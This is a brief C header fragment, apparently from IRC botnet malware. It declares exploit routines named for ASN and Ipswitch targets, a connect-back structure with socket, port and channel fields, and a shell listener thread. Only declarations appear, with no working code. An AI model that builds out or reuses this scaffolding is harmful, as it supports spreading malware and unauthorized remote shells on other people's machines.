unsigned int __stdcall asn_exploit(void *param);

unsigned int __stdcall ipswitch_exploit(void *param, char *target, const char *host);

typedef struct CONNBACK
{
	SOCKET sock;
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} CONNBACK;

DWORD WINAPI ShellListen(LPVOID pParam);